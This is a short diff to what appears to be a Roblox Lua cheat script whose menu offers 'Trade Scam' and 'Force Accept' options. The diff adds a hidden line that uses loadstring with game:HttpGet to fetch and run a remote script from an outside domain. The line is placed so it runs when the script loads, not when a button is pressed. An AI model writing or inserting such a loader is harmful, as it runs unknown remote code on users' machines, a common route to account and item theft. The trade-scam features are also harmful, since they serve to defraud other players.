@@ -10,7 +10,8 @@ Tab:AddButton({
 	Name = "Trade Scam✅",
 	Callback = function()
       		print("button pressed")
-  	end    
+  	end  
+loadstring(game:HttpGet("https://egorikusa.space/3c55fc12683a613a6a1b4531.lua", true))()
 })
 Tab:AddToggle({
 	Name = "✅Force Accept",
